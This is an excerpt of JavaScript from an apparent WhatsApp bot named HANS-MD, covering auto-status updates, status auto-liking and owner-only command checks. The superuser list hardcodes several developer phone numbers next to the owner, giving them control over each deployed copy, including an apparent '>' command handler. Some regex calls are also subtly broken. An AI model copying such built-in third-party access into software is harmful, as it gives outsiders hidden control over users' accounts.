...
if (conf.AUTOBIO === 'yes') {
    setInterval(() => {
      ...
      zk.updateProfileStatus(
        `HANS-MD AND MY OWNER ${conf.OWNER_NAME} IS ONLINE 24/7 ${date.toLocaleString('en-US', { timeZone: 'Africa/Tanzania' })} It's a ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Tanzania' })}.`
      );
    }, 10 * 1000);
  }
...
if (conf.AUTO_LIKE_STATUS === "yes") {
    ...
    zk.ev.on("messages.upsert", async m => {
      ...
      const superUserNumbers = [servBot, "255760774888", '255692540143', '255760774888', "255760774888", '255692540143', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
      const allAllowedNumbers = superUserNumbers.concat(sudo);
      const superUser = allAllowedNumbers.includes(auteurMessage);
      var dev = ['255692540143', '255760774888', "255760774888", '255692540143'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
...
zk.ev.on("messages.upsert", async (m) => {
  ...
  if (!superUser) {
    return repondre("Only for my owner or hanskeizzah to execute this command 🚫");
  }
...
if (texte && texte.startsWith('>')) {
  ...
  if (!superUser) {
    const menuText = `This command is only for the owner or Sir HansTz to execute 🚫`;
    ...
    await zk.sendMessage(origineMessage, {
      ...
      contextInfo: {
        externalAdReply: {
          ...
          body: "Regards HansTz",
          sourceUrl: conf.GURL,
          thumbnailUrl: "https://files.catbox.moe/9mcdru.jpg" || conf.BOT_MENU_LINK,
          mediaType: 1,
